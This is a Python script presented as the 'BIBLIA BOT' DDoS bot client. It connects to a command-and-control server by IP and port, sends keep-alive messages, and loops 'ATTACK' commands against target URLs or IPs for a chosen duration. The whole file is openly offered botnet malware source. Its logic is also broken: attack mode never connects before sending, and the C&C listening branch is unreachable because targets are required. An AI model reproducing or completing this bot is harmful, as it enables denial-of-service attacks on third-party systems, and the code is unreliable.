#!/usr/bin/env python3
import socket
import time
import argparse
import random
import threading
import sys

class BotClient:
    def __init__(self, server_ip, server_port, bot_id=None):
        self.server_ip = server_ip
        self.server_port = server_port
        self.bot_id = bot_id or f"BOT-{random.randint(1000, 9999)}"
        self.connected = False
        
    def connect_to_c2(self):
        """Connect to the C&C server"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.server_ip, self.server_port))
            self.connected = True
            print(f"[+] Connected to C&C server as {self.bot_id}")
            return True
        except Exception as e:
            print(f"[!] Failed to connect to C&C: {e}")
            return False
    
    def send_command(self, command):
        """Send command to C&C server"""
        if not self.connected:
            print("[!] Not connected to C&C")
            return False
            
        try:
            self.sock.send(command.encode())
            response = self.sock.recv(1024).decode('utf-8')
            print(response)
            return True
        except Exception as e:
            print(f"[!] Error sending command: {e}")
            self.connected = False
            return False
    
    def start_attacks(self, targets, duration=60):
        """Start DDoS attacks against targets"""
        start_time = time.time()
        while time.time() - start_time < duration:
            for target in targets:
                self.send_command(f"ATTACK {target}")
                time.sleep(random.uniform(0.5, 2.0))  # Random delay between attacks
    
    def run(self):
        """Main bot execution loop"""
        while True:
            if not self.connect_to_c2():
                time.sleep(5)  # Retry connection every 5 seconds
                continue
                
            print(f"[{self.bot_id}] Waiting for commands...")
            try:
                while self.connected:
                    # Send periodic keep-alive messages
                    self.sock.send(b"KEEPALIVE")
                    time.sleep(30)
            except:
                self.connected = False

def main():
    parser = argparse.ArgumentParser(description="BIBLIA BOT - DDoS Bot Client")
    parser.add_argument('--c2', required=True, help='C&C server IP')
    parser.add_argument('--port', type=int, default=9999, help='C&C server port')
    parser.add_argument('--id', help='Bot ID')
    parser.add_argument('--targets', nargs='+', required=True, help='Target URLs/IPs to attack')
    parser.add_argument('--duration', type=int, default=60, help='Attack duration in seconds')
    args = parser.parse_args()
    
    bot = BotClient(args.c2, args.port, args.id)
    
    if args.targets:
        # Run in attack mode
        print(f"[+] Starting DDoS attack against {args.targets} for {args.duration}s")
        bot.start_attacks(args.targets, args.duration)
    else:
        # Run in C&C client mode
        bot.run()

if __name__ == "__main__":
    main()
